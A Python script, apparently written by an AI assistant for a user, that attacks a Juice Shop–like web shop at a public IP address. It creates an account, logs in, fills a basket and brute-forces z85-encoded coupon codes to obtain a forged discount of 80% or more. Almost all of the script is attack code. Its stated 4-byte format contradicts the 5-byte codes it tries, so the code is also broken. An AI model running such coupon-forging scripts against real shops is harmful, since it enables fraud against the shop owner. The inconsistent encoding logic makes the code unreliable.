#!/usr/bin/env python3

import requests
import time

def test_your_exact_method():
    print("🎯 Testing YOUR EXACT working method from archive")
    print("Format: z85.encode(b'DEC99') - 4 bytes, not 8")
    
    base_url = "http://66.42.93.220:9000"  # v13.3.0
    session = requests.Session()
    
    # Auth
    email = f"exact{int(time.time())}@test.com"
    password = "Test123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Authenticated")
        
        # Add product
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": products[0]['id'], "quantity": 1
        })
        
        basket_id = session.get(f"{base_url}/rest/user/whoami").json()['user'].get('bid', 1)
        
        # Use Python zmq.z85 like your archive
        try:
            import zmq
            
            # Your exact working codes from archive
            test_codes = [
                b"DEC99",  # Your exact working code
                b"NOV99", b"OCT99", b"SEP99",
                b"DEC90", b"DEC85", b"NOV90",
            ]
            
            print(f"\\nTesting with zmq.z85.encode()...")
            
            for code_bytes in test_codes:
                try:
                    coupon_encoded = zmq.z85.encode(code_bytes)
                    print(f"   {code_bytes.decode()} → {coupon_encoded}")
                    
                    response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{coupon_encoded}", json={})
                    
                    if response.status_code == 200:
                        result = response.json()
                        discount = result.get('discount', 0)
                        
                        if discount >= 80:
                            print(f"   🎉 SUCCESS! {discount}% discount!")
                            return True
                        elif discount > 0:
                            print(f"   ✅ Working: {discount}%")
                    else:
                        print(f"   ❌ HTTP {response.status_code}")
                        
                except Exception as e:
                    print(f"   Error: {e}")
            
        except ImportError:
            print("❌ zmq.z85 not available")
    
    return False

success = test_your_exact_method()

if success:
    print(f"\\n🏆 CONFIRMED: Your method works!")
else:
    print(f"\\n🔍 Need to find your exact working configuration")
    
    # Let me check what version your archive indicates worked
    print(f"\\n📋 From your archive analysis:")
    print(f"   - Used 'localhost:3001' (not 3000)")
    print(f"   - Format: z85.encode(b'DEC99')")  
    print(f"   - Archive shows solved challenges")
    print(f"   - May need specific startup configuration")

